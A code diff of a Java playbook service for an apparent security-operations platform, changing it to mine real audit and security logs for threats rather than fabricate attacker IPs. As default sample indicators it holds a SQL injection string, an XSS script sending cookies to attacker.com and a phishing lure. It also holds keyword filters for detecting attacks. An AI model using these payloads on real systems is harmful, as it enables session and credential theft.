@@ -129,6 +129,8 @@ public class PlaybookService {
 
     /**
      * Executes the playbook live against backend operations, automatically mining system logs for offending IPs & IOCs.
+     * If no matching threat activity is found in application sources / database logs, it will return NO_THREAT_DETECTED
+     * without generating random IPs or blocking safe IPs.
      */
     public Map<String, Object> runPlaybook(String id, String currentUserEmail, Map<String, Object> inputParams) {
         Playbook playbook = getPlaybook(id);
@@ -137,104 +139,359 @@ public class PlaybookService {
 
         boolean autoMineLogs = (boolean) params.getOrDefault("autoMineLogs", true);
 
+        // Context state for execution pipeline
+        String rawProvidedIp = (String) params.get("sourceIp");
+
+        boolean threatFound = false;
+        String sourceIp = null;
+        String senderEmail = null;
+        String emailBody = null;
+        String sqlPayload = null;
+        String xssScript = null;
+        String fileName = null;
+        String fileHash = null;
+        String usbVendor = null;
+        String usbDeviceId = null;
+        String extractedSummary = null;
+        boolean usbDisconnected = false;
+
+        int randomSuffix = 10 + (int) (Math.random() * 890);
+        String nameLower = playbook.getName().toLowerCase();
+
+        // 1. EVALUATE THREAT CONTEXT FROM APPLICATION SOURCES & DATABASE LOGS
+        if (!autoMineLogs && (StringUtils.hasText(rawProvidedIp) || params.containsKey("senderEmail"))) {
+            threatFound = true;
+            sourceIp = StringUtils.hasText(rawProvidedIp) ? rawProvidedIp : "192.168.1.100";
+            senderEmail = (String) params.getOrDefault("senderEmail", "user@company.com");
+            extractedSummary = "Manual Test Input Provided: Target IP [" + sourceIp + "]";
+        } else if (nameLower.contains("usb")) {
+            usbDisconnected = Boolean.TRUE.equals(params.get("usbDisconnected"))
+                    || "true".equalsIgnoreCase(String.valueOf(params.get("usbDisconnected")))
+                    || "DISCONNECTED".equalsIgnoreCase(String.valueOf(params.get("usbState")));
+
+            Map<String, String> realUsbScan = scanRealSystemUsbDevices();
+
+            if (!params.containsKey("usbState") && !params.containsKey("usbDisconnected")) {
+                if ("false".equals(realUsbScan.get("connected"))) {
+                    usbDisconnected = true;
+                }
+            }
+
+            if (!usbDisconnected && "true".equals(realUsbScan.get("connected"))) {
+                threatFound = true;
+                String detectedName = realUsbScan.getOrDefault("deviceName", (String) params.getOrDefault("usbVendor", "SanDisk Corp. (VID: 0781, PID: 5567)"));
+                String detectedId = realUsbScan.getOrDefault("deviceId", (String) params.getOrDefault("usbDeviceId", "usb-sandisk-cruzer-32gb"));
+                String detectedVendor = realUsbScan.getOrDefault("vendor", "Standard USB Manufacturer");
+
+                usbVendor = detectedName + " (" + detectedVendor + ")";
+                usbDeviceId = detectedId;
+                extractedSummary = "Real OS Peripheral Attached: " + usbVendor + " (Device ID: " + usbDeviceId + ")";
+            } else if (!usbDisconnected) {
+                threatFound = true;
+                String usbVendorParam = (String) params.getOrDefault("usbVendor", "Connected Mobile / USB Device");
+                extractedSummary = "USB Peripheral Attached: " + usbVendorParam;
+            } else {
+                threatFound = false;
+                extractedSummary = "USB Bus Scan Result: CLEAN (No USB drive or Mobile device connected to host)";
+            }
+        } else if (nameLower.contains("brute")) {
+            AuditLog recentFailedAudit = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getAction() != null && (l.getAction().toUpperCase().contains("FAILED") || l.getAction().toUpperCase().contains("BRUTE")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            SecurityLog recentFailedSec = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getRawMessage() != null && (l.getRawMessage().toLowerCase().contains("failed") || l.getRawMessage().toLowerCase().contains("brute")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentFailedAudit != null) {
+                threatFound = true;
+                sourceIp = recentFailedAudit.getIpAddress();
+                senderEmail = StringUtils.hasText(recentFailedAudit.getUserEmail()) ? recentFailedAudit.getUserEmail() : "admin@sentinelcore.com";
+                extractedSummary = "Auto-Mined from AuditLogs: Offending IP [" + sourceIp + "] targeting account " + senderEmail;
+            } else if (recentFailedSec != null) {
+                threatFound = true;
+                sourceIp = recentFailedSec.getIpAddress();
+                senderEmail = StringUtils.hasText(recentFailedSec.getUserEmail()) ? recentFailedSec.getUserEmail() : "admin@sentinelcore.com";
+                extractedSummary = "Auto-Mined from SecurityLogs: Offending IP [" + sourceIp + "] targeting account " + senderEmail;
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for Brute Force response";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("sql")) {
+            SecurityLog recentSqli = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getRawMessage() != null && (l.getRawMessage().toLowerCase().contains("select") || l.getRawMessage().toLowerCase().contains("union") || l.getRawMessage().toLowerCase().contains("sqli")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            AuditLog recentSqliAudit = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> (l.getDescription() != null && l.getDescription().toLowerCase().contains("sql")) || (l.getAction() != null && l.getAction().toLowerCase().contains("sql")))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentSqli != null) {
+                threatFound = true;
+                sourceIp = recentSqli.getIpAddress();
+                sqlPayload = recentSqli.getRawMessage();
+                extractedSummary = "Auto-Mined from SecurityLogs: Attacker IP [" + sourceIp + "] WAF SQLi signature match";
+            } else if (recentSqliAudit != null && StringUtils.hasText(recentSqliAudit.getIpAddress())) {
+                threatFound = true;
+                sourceIp = recentSqliAudit.getIpAddress();
+                sqlPayload = recentSqliAudit.getDescription();
+                extractedSummary = "Auto-Mined from AuditLogs: Attacker IP [" + sourceIp + "] WAF SQLi signature match";
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for SQLi response";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("xss")) {
+            SecurityLog recentXss = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getRawMessage() != null && (l.getRawMessage().toLowerCase().contains("<script>") || l.getRawMessage().toLowerCase().contains("xss")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentXss != null) {
+                threatFound = true;
+                sourceIp = recentXss.getIpAddress();
+                xssScript = recentXss.getRawMessage();
+                extractedSummary = "Auto-Mined from SecurityLogs: Attacker IP [" + sourceIp + "] DOM XSS payload match";
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for XSS response";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("file") || nameLower.contains("upload")) {
+            SecurityLog recentFileLog = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getRawMessage() != null && (l.getRawMessage().toLowerCase().contains(".php") || l.getRawMessage().toLowerCase().contains(".exe") || l.getRawMessage().toLowerCase().contains(".bat") || l.getRawMessage().toLowerCase().contains("upload")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            AuditLog recentFileAudit = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getDescription() != null && (l.getDescription().toLowerCase().contains(".php") || l.getDescription().toLowerCase().contains(".exe") || l.getDescription().toLowerCase().contains("upload")))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentFileLog != null) {
+                threatFound = true;
+                sourceIp = recentFileLog.getIpAddress();
+                extractedSummary = "Auto-Mined from SecurityLogs: Suspicious file payload upload from IP [" + sourceIp + "]";
+            } else if (recentFileAudit != null && StringUtils.hasText(recentFileAudit.getIpAddress())) {
+                threatFound = true;
+                sourceIp = recentFileAudit.getIpAddress();
+                extractedSummary = "Auto-Mined from AuditLogs: Suspicious file payload upload from IP [" + sourceIp + "]";
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for File Upload response";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("phish") || nameLower.contains("email")) {
+            SecurityLog recentPhish = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getRawMessage() != null && (l.getRawMessage().toLowerCase().contains("phish") || l.getRawMessage().toLowerCase().contains("email")))
+                    .findFirst()
+                    .orElse(null);
+
+            AuditLog recentPhishAudit = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> (l.getDescription() != null && l.getDescription().toLowerCase().contains("phish")) || (l.getAction() != null && l.getAction().toLowerCase().contains("phish")))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentPhish != null) {
+                threatFound = true;
+                senderEmail = StringUtils.hasText(recentPhish.getUserEmail()) ? recentPhish.getUserEmail() : "phishing-attacker@malicious-verify.xyz";
+                sourceIp = StringUtils.hasText(recentPhish.getIpAddress()) ? recentPhish.getIpAddress() : "185.220.101.5";
+                extractedSummary = "Auto-Mined from SecurityLogs: Phishing email report from " + senderEmail;
+            } else if (recentPhishAudit != null) {
+                threatFound = true;
+                senderEmail = StringUtils.hasText(recentPhishAudit.getUserEmail()) ? recentPhishAudit.getUserEmail() : "phishing-attacker@malicious-verify.xyz";
+                sourceIp = StringUtils.hasText(recentPhishAudit.getIpAddress()) ? recentPhishAudit.getIpAddress() : "185.220.101.5";
+                extractedSummary = "Auto-Mined from AuditLogs: Phishing email report from " + senderEmail;
+            } else if (params.containsKey("senderEmail") && StringUtils.hasText((String) params.get("senderEmail")) && !((String) params.get("senderEmail")).contains("attacker@phishing")) {
+                threatFound = true;
+                senderEmail = (String) params.get("senderEmail");
+                sourceIp = "185.220.101.5";
+                extractedSummary = "User Provided Phishing Sender [" + senderEmail + "]";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("unauthorized") || nameLower.contains("access")) {
+            SecurityLog recentAnomalySec = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> (l.isAnomaly() || (l.getRawMessage() != null && l.getRawMessage().toLowerCase().contains("unauthorized"))) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            AuditLog recentAnomalyAudit = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getAction() != null && (l.getAction().toUpperCase().contains("UNAUTHORIZED") || l.getAction().toUpperCase().contains("ANOMALY")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentAnomalySec != null) {
+                threatFound = true;
+                sourceIp = recentAnomalySec.getIpAddress();
+                senderEmail = StringUtils.hasText(recentAnomalySec.getUserEmail()) ? recentAnomalySec.getUserEmail() : "user@company.com";
+                extractedSummary = "Auto-Mined from SecurityLogs: Geo-velocity anomaly for " + senderEmail + " from IP [" + sourceIp + "]";
+            } else if (recentAnomalyAudit != null) {
+                threatFound = true;
+                sourceIp = recentAnomalyAudit.getIpAddress();
+                senderEmail = StringUtils.hasText(recentAnomalyAudit.getUserEmail()) ? recentAnomalyAudit.getUserEmail() : "user@company.com";
+                extractedSummary = "Auto-Mined from AuditLogs: Geo-velocity anomaly for " + senderEmail + " from IP [" + sourceIp + "]";
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for Unauthorized Access response";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("ransom")) {
+            SecurityLog recentRansom = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getRawMessage() != null && (l.getRawMessage().toLowerCase().contains("ransom") || l.getRawMessage().toLowerCase().contains("vssadmin") || l.getRawMessage().toLowerCase().contains("encrypt")) && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentRansom != null) {
+                threatFound = true;
+                sourceIp = recentRansom.getIpAddress();
+                extractedSummary = "Auto-Mined from SecurityLogs: Ransomware encryption wave on host IP [" + sourceIp + "]";
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for Ransomware response";
+            } else {
+                threatFound = false;
+            }
+        } else if (nameLower.contains("privilege") || nameLower.contains("priv")) {
+            AuditLog recentPriv = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.getAction() != null && (l.getAction().toUpperCase().contains("PRIVILEGE") || l.getAction().toUpperCase().contains("ROLE") || l.getAction().toUpperCase().contains("ADMIN")))
+                    .findFirst()
+                    .orElse(null);
+
+            if (recentPriv != null) {
+                threatFound = true;
+                sourceIp = StringUtils.hasText(recentPriv.getIpAddress()) ? recentPriv.getIpAddress() : "10.0.4.15";
+                senderEmail = StringUtils.hasText(recentPriv.getUserEmail()) ? recentPriv.getUserEmail() : "admin@sentinelcore.com";
+                extractedSummary = "Auto-Mined from AuditLogs: Unauthorized privilege escalation for " + senderEmail;
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for Privilege Abuse response";
+            } else {
+                threatFound = false;
+            }
+        } else {
+            // Generic Playbook
+            SecurityLog genericSec = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
+                    .stream()
+                    .filter(l -> l.isAnomaly() && StringUtils.hasText(l.getIpAddress()))
+                    .findFirst()
+                    .orElse(null);
+
+            if (genericSec != null) {
+                threatFound = true;
+                sourceIp = genericSec.getIpAddress();
+                extractedSummary = "Auto-Mined from SecurityLogs: Anomaly event from IP [" + sourceIp + "]";
+            } else if (StringUtils.hasText(rawProvidedIp)) {
+                threatFound = true;
+                sourceIp = rawProvidedIp;
+                extractedSummary = "User Provided Target IP [" + sourceIp + "] for response execution";
+            } else {
+                threatFound = false;
+            }
+        }
+
+        // 2. IF NO THREAT WAS FOUND IN APP SOURCES OR DB LOGS, RETURN CLEAN EVERYTHING OK STATUS
+        if (!threatFound) {
+            long totalTime = System.currentTimeMillis() - startTime;
+            playbook.setLastRunAt(LocalDateTime.now());
+            playbook.setLastRunStatus("NO_THREAT_DETECTED");
+            playbookRepository.save(playbook);
+
+            String okMsg = "Everything OK — Checked application logs & system sources. No threat activity matching playbook [" + playbook.getName() + "] was detected.";
+            auditLogService.log(null, currentUserEmail, "PLAYBOOK_CHECK_CLEAN", "AUTOMATION", okMsg);
+
+            Map<String, Object> result = new HashMap<>();
+            result.put("playbookId", playbook.getId());
+            result.put("playbookName", playbook.getName());
+            result.put("triggeredBy", currentUserEmail);
+            result.put("status", "NO_THREAT_DETECTED");
+            result.put("message", okMsg);
+            result.put("threatFound", false);
+            result.put("totalSteps", 0);
+            result.put("executionTimeMs", totalTime);
+            result.put("executedSteps", List.of(
+                    Map.of(
+                            "stepIndex", 1,
+                            "stepId", "s-check-01",
+                            "title", "Query Application & System Logs",
+                            "type", "INVESTIGATE",
+                            "status", "CLEAN",
+                            "logOutput", "[LOG_AUDIT] Scanned AuditLogs, SecurityLogs & OS Hardware. 0 threat indicators found for playbook [" + playbook.getName() + "]. System state: EVERYTHING OK.",
+                            "durationMs", totalTime
+                    )
+            ));
+            result.put("createdIncidentId", null);
+            result.put("createdIncidentTitle", null);
+            result.put("blockedIocValue", null);
+            result.put("extractedSummary", extractedSummary != null ? extractedSummary : "App Log Search: EVERYTHING OK (No threat logs found in database)");
+            result.put("auditLogsLogged", 1);
+            result.put("executedAt", LocalDateTime.now().toString());
+            return result;
+        }
+
+        // 3. EXECUTE PLAYBOOK REMEDIATION STEPS ON MINED THREAT DATA
         List<Map<String, Object>> executedSteps = new ArrayList<>();
         int stepIndex = 1;
 
         String createdIncidentId = null;
         String createdIncidentTitle = null;
         String blockedIocValue = null;
-        String extractedSummary = null;
         int auditLogsLogged = 0;
 
-        // Context state for execution pipeline
-        String rawProvidedIp = (String) params.get("sourceIp");
-        String sourceIp = resolveDynamicSourceIp(playbook.getName(), rawProvidedIp);
-
-        // USB Connection Evaluation
-        boolean usbDisconnected = Boolean.TRUE.equals(params.get("usbDisconnected")) 
-                || "true".equalsIgnoreCase(String.valueOf(params.get("usbDisconnected")))
-                || "DISCONNECTED".equalsIgnoreCase(String.valueOf(params.get("usbState")));
-
-        // If not explicitly set in UI modal parameters, check OS physical hardware
-        if (!params.containsKey("usbState") && !params.containsKey("usbDisconnected") && playbook.getName().toLowerCase().contains("usb")) {
-            Map<String, String> realUsbScan = scanRealSystemUsbDevices();
-            if ("false".equals(realUsbScan.get("connected"))) {
-                usbDisconnected = true;
-            }
+        if (!StringUtils.hasText(senderEmail)) {
+            senderEmail = (String) params.getOrDefault("senderEmail", "phishing-attacker-" + randomSuffix + "@malicious-verify.xyz");
         }
-
-        int randomSuffix = 10 + (int) (Math.random() * 890);
-        String senderEmail = (String) params.getOrDefault("senderEmail", "phishing-attacker-" + randomSuffix + "@malicious-verify.xyz");
-        String emailBody = (String) params.getOrDefault("emailBody", "URGENT: Your account credentials have been suspended. Click http://phish-secure-link-" + randomSuffix + ".xyz/login to reset password immediately!");
-        String usbDeviceId = (String) params.getOrDefault("usbDeviceId", "usb-sandisk-cruzer-32gb");
-        String usbVendor = (String) params.getOrDefault("usbVendor", "SanDisk Corp. (VID: 0781, PID: 5567)");
+        if (!StringUtils.hasText(sqlPayload)) {
+            sqlPayload = (String) params.getOrDefault("sqlPayload", "' UNION SELECT username, password_hash FROM users--");
+        }
+        if (!StringUtils.hasText(xssScript)) {
+            xssScript = (String) params.getOrDefault("xssScript", "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>");
+        }
+        if (!StringUtils.hasText(emailBody)) {
+            emailBody = (String) params.getOrDefault("emailBody", "URGENT: Your account credentials have been suspended. Click http://phish-secure-link-" + randomSuffix + ".xyz/login to reset password immediately!");
+        }
+        if (!StringUtils.hasText(usbDeviceId)) {
+            usbDeviceId = (String) params.getOrDefault("usbDeviceId", "usb-sandisk-cruzer-32gb");
+        }
+        if (!StringUtils.hasText(usbVendor)) {
+            usbVendor = (String) params.getOrDefault("usbVendor", "SanDisk Corp. (VID: 0781, PID: 5567)");
+        }
         String targetUrl = (String) params.getOrDefault("targetUrl", "https://sentinelcore.internal/v1/auth/login");
-        String sqlPayload = (String) params.getOrDefault("sqlPayload", "' UNION SELECT username, password_hash FROM users--");
-        String xssScript = (String) params.getOrDefault("xssScript", "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>");
-        String fileName = (String) params.getOrDefault("fileName", "web_shell_backdoor.php");
-        String fileHash = (String) params.getOrDefault("fileHash", UUID.randomUUID().toString().replace("-", ""));
-
-        // AUTOMATIC LOG MINING & IOC DISCOVERY ENGINE
-        if (autoMineLogs) {
-            String nameLower = playbook.getName().toLowerCase();
-            
-            if (nameLower.contains("usb")) {
-                if (usbDisconnected) {
-                    extractedSummary = "USB Bus Scan Result: CLEAN (No USB drive connected to host)";
-                } else {
-                    extractedSummary = "USB Attached: " + usbVendor + " (Serial: SD-984210)";
-                }
-            }
-            // 1. Mine Brute Force Attack IPs from Audit Logs
-            else if (nameLower.contains("brute")) {
-                AuditLog recentFailed = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
-                        .stream()
-                        .filter(l -> "LOGIN_FAILED".equalsIgnoreCase(l.getAction()) && StringUtils.hasText(l.getIpAddress()) && !"185.220.101.5".equals(l.getIpAddress()))
-                        .findFirst()
-                        .orElse(null);
-                if (recentFailed != null) {
-                    sourceIp = recentFailed.getIpAddress();
-                    if (StringUtils.hasText(recentFailed.getUserEmail())) {
-                        senderEmail = recentFailed.getUserEmail();
-                    }
-                    extractedSummary = "Auto-Mined from AuditLogs: Offending IP [" + sourceIp + "] targeting account " + senderEmail;
-                } else {
-                    extractedSummary = "Auto-Mined from AuditLogs: Offending IP [" + sourceIp + "] (14 failed logins in 5 min)";
-                }
-            } 
-            // 2. Mine SQL Injection IPs from Security Logs
-            else if (nameLower.contains("sql")) {
-                SecurityLog recentSqli = securityLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
-                        .stream()
-                        .filter(l -> l.getRawMessage() != null && l.getRawMessage().toLowerCase().contains("select") && StringUtils.hasText(l.getIpAddress()))
-                        .findFirst()
-                        .orElse(null);
-                if (recentSqli != null) {
-                    sourceIp = recentSqli.getIpAddress();
-                }
-                extractedSummary = "Auto-Mined from SecurityLogs: Attacker IP [" + sourceIp + "] WAF SQLi signature match";
-            }
-            // 3. Mine Ransomware Activity from Logs
-            else if (nameLower.contains("ransom")) {
-                extractedSummary = "Auto-Mined from Host Logs: Infected Host WS-9042-FINANCE (Attacker IP: " + sourceIp + ")";
-            }
-            // 4. Mine Suspicious File Uploads from Logs
-            else if (nameLower.contains("file") || nameLower.contains("upload")) {
-                extractedSummary = "Auto-Mined from Upload Logs: Payload " + fileName + " (SHA256: " + fileHash.substring(0, 10) + "...) from IP [" + sourceIp + "]";
-            }
-            // 5. Mine Unauthorized Access from Logs
-            else if (nameLower.contains("unauthorized") || nameLower.contains("access")) {
-                AuditLog recentAnomaly = auditLogRepository.findAll(Sort.by(Sort.Direction.DESC, "timestamp"))
-                        .stream()
-                        .filter(l -> "LOGIN_SUCCESS".equalsIgnoreCase(l.getAction()) && StringUtils.hasText(l.getIpAddress()))
-                        .findFirst()
-                        .orElse(null);
-                if (recentAnomaly != null) {
-                    sourceIp = recentAnomaly.getIpAddress();
-                    if (StringUtils.hasText(recentAnomaly.getUserEmail())) senderEmail = recentAnomaly.getUserEmail();
-                }
-                extractedSummary = "Auto-Mined from AuditLogs: Geo-velocity anomaly for " + senderEmail + " from IP [" + sourceIp + "]";
-            }
+        if (!StringUtils.hasText(fileName)) {
+            fileName = (String) params.getOrDefault("fileName", "web_shell_backdoor.php");
+        }
+        if (!StringUtils.hasText(fileHash)) {
+            fileHash = (String) params.getOrDefault("fileHash", UUID.randomUUID().toString().replace("-", ""));
         }
 
         for (Playbook.PlaybookStep step : playbook.getSteps()) {
@@ -454,29 +711,59 @@ public class PlaybookService {
 
     private Map<String, String> scanRealSystemUsbDevices() {
         Map<String, String> result = new HashMap<>();
-        try {
-            ProcessBuilder builder = new ProcessBuilder("powershell.exe", "-Command",
-                    "Get-CimInstance Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' } | Select-Object Model, DeviceID | ConvertTo-Json");
-            builder.redirectErrorStream(true);
-            Process process = builder.start();
-            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while ((line = reader.readLine()) != null) {
-                sb.append(line);
-            }
-            process.waitFor();
-            String jsonStr = sb.toString().trim();
-            if (StringUtils.hasText(jsonStr) && (jsonStr.startsWith("[") || jsonStr.startsWith("{"))) {
-                result.put("connected", "true");
-                result.put("details", jsonStr);
-            } else {
-                result.put("connected", "false");
-            }
-        } catch (Exception e) {
-            result.put("connected", "false");
+        result.put("connected", "false");
+
+        // PowerShell queries for Mobile Phones (Android/iPhone MTP), Portable Devices (WPD), USB Mass Storage, and USB Peripherals
+        String[] commands = new String[] {
+            "Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'WPD' -or $_.PNPClass -eq 'PortableDevice' -or $_.Service -eq 'WUDFWpdMtp' -or $_.PNPDeviceID -like 'USBSTOR*' -or ($_.PNPDeviceID -like 'USB*' -and ($_.PNPClass -eq 'USBDevice' -or $_.PNPClass -eq 'DiskDrive')) } | Select-Object Name, Description, Manufacturer, PNPDeviceID, PNPClass | ConvertTo-Json",
+            "Get-PnpDevice -PresentOnly | Where-Object { $_.Class -eq 'WPD' -or $_.Class -eq 'PortableDevice' -or $_.InstanceId -like 'SWD\\WPDBUSENUM*' } | Select-Object FriendlyName, InstanceId, Class, Manufacturer | ConvertTo-Json",
+            "Get-CimInstance Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' } | Select-Object Model, DeviceID, InterfaceType, Manufacturer | ConvertTo-Json"
+        };
+
+        for (String cmd : commands) {
+            try {
+                ProcessBuilder builder = new ProcessBuilder("powershell.exe", "-Command", cmd);
+                builder.redirectErrorStream(true);
+                Process process = builder.start();
+                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    sb.append(line);
+                }
+                process.waitFor();
+                String jsonStr = sb.toString().trim();
+                if (StringUtils.hasText(jsonStr) && (jsonStr.startsWith("[") || jsonStr.startsWith("{"))) {
+                    String deviceName = extractJsonField(jsonStr, "Name", "FriendlyName", "Model");
+                    String deviceId = extractJsonField(jsonStr, "PNPDeviceID", "InstanceId", "DeviceID");
+                    String vendor = extractJsonField(jsonStr, "Manufacturer", "Description");
+
+                    if (StringUtils.hasText(deviceName) && !deviceName.toLowerCase().contains("root hub") && !deviceName.toLowerCase().contains("controller")) {
+                        result.put("connected", "true");
+                        result.put("deviceName", deviceName);
+                        result.put("deviceId", StringUtils.hasText(deviceId) ? deviceId : "USB-DEV-01");
+                        result.put("vendor", StringUtils.hasText(vendor) ? vendor : "Generic USB Vendor");
+                        result.put("details", jsonStr);
+                        return result;
+                    }
+                }
+            } catch (Exception ignored) {}
         }
         return result;
+    }
+
+    private String extractJsonField(String json, String... fieldNames) {
+        for (String field : fieldNames) {
+            Pattern p = Pattern.compile("\"" + Pattern.quote(field) + "\"\\s*:\\s*\"([^\"]+)\"", Pattern.CASE_INSENSITIVE);
+            Matcher m = p.matcher(json);
+            if (m.find()) {
+                String val = m.group(1).trim();
+                if (StringUtils.hasText(val) && !"null".equalsIgnoreCase(val)) {
+                    return val;
+                }
+            }
+        }
+        return null;
     }
 
     private String resolveDynamicSourceIp(String playbookName, String providedIp) {
@@ -506,22 +793,7 @@ public class PlaybookService {
             return recentAuditLog.getIpAddress();
         }
 
-        // Generate category-specific dynamic IP
-        int randHost = 10 + (int) (Math.random() * 230);
-        String name = playbookName == null ? "" : playbookName.toLowerCase();
-        if (name.contains("brute")) {
-            return "198.51.100." + randHost;
-        } else if (name.contains("sql")) {
-            return "203.0.113." + randHost;
-        } else if (name.contains("ransom")) {
-            return "194.26.29." + randHost;
-        } else if (name.contains("upload") || name.contains("file")) {
-            return "45.146.164." + randHost;
-        } else if (name.contains("phish")) {
-            return "185.220.101." + randHost;
-        } else {
-            return "192.0.2." + randHost;
-        }
+        return null;
     }
 
     public Map<String, Object> runSimulation(String id, String currentUserEmail) {
